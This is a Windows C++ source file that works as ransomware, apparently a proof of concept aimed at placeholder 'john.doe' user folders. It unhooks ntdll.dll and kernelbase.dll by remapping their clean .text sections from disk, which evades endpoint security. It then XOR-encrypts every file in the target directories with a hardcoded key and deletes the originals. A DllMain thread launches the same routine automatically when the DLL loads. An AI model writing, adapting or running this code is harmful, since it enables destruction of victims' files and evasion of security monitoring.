#include <cstdlib>
#include <cstring>
#include <cstdio>
#include <filesystem>
#include <fstream>
#include <string>
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>
#include <thread>

using namespace std;

static const string ENC_EXTENSION = "enc";

static char ENC_KEY[] = "D34dB33F";

#define BUFFER_SIZE 1024

// From: https://inf0sec.fr/article-20.php
int unHook(const string &name)
{
    cout << "Unhooking " << name << endl;
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA(name.c_str());
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE ntdllFile = CreateFileA(("C:\\windows\\system32\\" + name).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        if (!strcmp((char *)hookedSectionHeader->Name, (char *)".text"))
        {
            DWORD oldProtection = 0;
            BOOL isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }
    CloseHandle(process);
    CloseHandle(ntdllFile);
    CloseHandle(ntdllMapping);
    FreeLibrary(ntdllModule);
    return 0;
}

void encrypt_file(const string &path, const string &encrypted_path)
{
    ifstream in(path, ios::binary);
    ofstream out(encrypted_path, ios::binary);
    if (!in.is_open() || !out.is_open())
    {
        cout << "Error opening file" << endl;
        return;
    }
    char buffer[BUFFER_SIZE];
    while (!in.eof())
    {
        in.read(buffer, BUFFER_SIZE);
        int read_bytes = in.gcount();
        for (int i = 0; i < read_bytes; i++)
        {
            buffer[i] = buffer[i] ^ ENC_KEY[i % sizeof(ENC_KEY)];
        }
        out.write(buffer, read_bytes);
    }
    in.close();
    out.close();
    remove(path.c_str());
}

void encrypt_dir(const string &dir)
{
    if (!std::filesystem::exists(dir))
    {
        cout << "Directory does not exist: " << dir << endl;
        return;
    }
    cout << "Encrypting directory: " << dir << endl;

    for (auto &p : filesystem::recursive_directory_iterator(dir))
    {
        if (p.is_regular_file())
        {
            string name = p.path().filename().string();
            string ext = name.substr(name.find_last_of('.') + 1);
            if (ext != ENC_EXTENSION)
            {
                string path = p.path().string();
                string encrypted_path = path + "." + ENC_EXTENSION;
                encrypt_file(path, encrypted_path);
            }
        }
    }
}

// Run from exe
int main(int argc, char *argv[])
{
    Sleep(1000);
    unHook("ntdll.dll");
    Sleep(1000);
    unHook("kernelbase.dll");
    Sleep(1000);

    encrypt_dir("C:\\Users\\Public\\john.doe");
    encrypt_dir("C:\\Users\\john.doe");
    cout << "John Doe is now encrypted!" << endl;
    cin.get();
}

// Run from dll
void msgBox()
{
    MessageBox(0, "Hello From DLL!", "Hello", MB_ICONINFORMATION);
}

void run()
{
    Sleep(1000);
    unHook("ntdll.dll");
    Sleep(1000);
    unHook("kernelbase.dll");
    Sleep(1000);

    encrypt_dir("C:\\Users\\Public\\john.doe");
    encrypt_dir("C:\\Users\\john.doe");
    MessageBox(0, "John Doe is now encrypted!", "Encryption", MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)msgBox, NULL, 0, NULL);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, NULL);
    }
    return TRUE;
}